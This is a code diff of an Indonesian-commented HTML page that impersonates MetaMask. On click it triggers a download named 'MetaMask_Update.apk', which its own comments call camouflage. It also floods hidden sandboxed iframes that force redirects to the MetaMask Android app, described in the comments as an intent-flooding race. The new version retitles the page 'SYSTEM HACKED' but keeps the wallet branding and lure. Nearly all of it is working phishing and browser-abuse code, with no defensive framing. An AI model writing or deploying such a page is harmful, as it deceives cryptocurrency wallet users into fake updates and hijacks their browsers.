@@ -3,26 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Verification</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #000; color: #f00; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; cursor: pointer; text-align: center;
+    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 4px solid #f6851b; }
-  h2 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
+  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+  h2 { animation: blink 0.2s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
   iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🦊 MetaMask Verification</h2>
-  <p>Klik di mana saja untuk melanjutkan.</p>
+  <h2>☢️ SYSTEM HACKED ☢️</h2>
+  <p>Klik di mana saja untuk memulai.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -41,7 +41,7 @@
   }
 
   // ============================================
-  // 1. NATIVE METAMASK INTENT
+  // 1. KONFIGURASI INTENT
   // ============================================
   var METAMASK_INTENT = "intent://#Intent;" +
                         "package=io.metamask;" +
@@ -49,90 +49,81 @@
                         "end;";
 
   // ============================================
-  // 2. TRIGGER CHAIN (KLIK)
+  // 2. TRIGGER FLOODING (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>Memverifikasi...</h2>
-      <p>Menghubungkan ke MetaMask...</p>
+      <h2>EXECUTING FLOOD...</h2>
+      <p>Memulai Intent Flooding 200ms...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Chained Race...");
+    log("[!] Memulai Multi-Iframe Intent Flood...");
 
-    // ============================================
-    // A. TASK 1: BLOB APK DOWNLOAD (KAMUFLASE)
-    // ============================================
+    // A. Kamuflase: Unduh APK
     try {
-      // Header APK (Dummy)
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
       var bytes = new Uint8Array(binary.length);
       for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      // MIME Type APK
-      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
       var url = URL.createObjectURL(blob);
-      
-      var a = document.createElement("a");
+      var a = document.createElement('a');
       a.href = url;
-      a.download = "MetaMask_Update.apk";
+      a.download = 'MetaMask_Update.apk';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
-      
-      log("[+] APK Download Triggered (Camouflage).");
-    } catch(e) {
-      log("[-] APK Error: " + e.message);
-    }
+      log("[+] APK Download Triggered.");
+    } catch(e) {}
 
-    // ============================================
-    // B. TASK 2: INTENT INJECTION (RACE CONDITION)
-    // ============================================
-    // Eksekusi dalam 0ms setelah APK mulai terunduh.
-    // Tujuannya agar Intent diproses saat browser sedang sibuk dengan unduhan.
-    
-    setTimeout(function() {
-      log("[+] Mengirim Intent MetaMask (Race 0ms)...");
-      try {
-        // Top-Level Navigation
-        window.location.href = METAMASK_INTENT;
-      } catch(e) {}
-    }, 0); // 0ms
+    // B. FLOODING IFRAME (200ms Window)
+    var iframeCount = 0;
+    var maxIframes = 30; // Jumlah iframe (30 sudah sangat berat)
+    var interval = 5; // Setiap 5ms buat 1 iframe (200ms / 30 = ~6.6ms)
 
-    // ============================================
-    // C. TASK 3: IFRAME SANDBOX (BYPASS FALLBACK)
-    // ============================================
-    setTimeout(function() {
-      log("[+] Mengirim Intent via Iframe...");
+    var floodInterval = setInterval(function() {
+      if (iframeCount >= maxIframes) {
+        clearInterval(floodInterval);
+        log("[!] Flooding Selesai. Mengirim Fallback...");
+        
+        // Fallback Top-Level setelah 200ms
+        setTimeout(function() {
+          window.location.href = METAMASK_INTENT;
+        }, 50);
+        return;
+      }
+
       try {
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
+        
+        // Suntikkan Intent ke dalam iframe
         iframe.srcdoc = `
           <!DOCTYPE html>
           <html>
           <body>
             <script>
+              // Redirect ke MetaMask
               window.top.location.href = "${METAMASK_INTENT}";
             <\/script>
           </body>
           </html>
         `;
+        
         document.getElementById("launcher-container").appendChild(iframe);
+        iframeCount++;
+        
+        if (iframeCount % 10 === 0) {
+          log("[+] Iframe Intent " + iframeCount + " terkirim.");
+        }
       } catch(e) {}
-    }, 100);
 
-    // ============================================
-    // D. TASK 4: FALLBACK (JIKA DUA METODE GAGAL)
-    // ============================================
-    setTimeout(function() {
-      log("[+] Fallback ke Universal Link...");
-      window.location.href = "https://metamask.app.link/";
-    }, 1000);
+    }, interval); // 5ms
 
   }, { once: true });
 
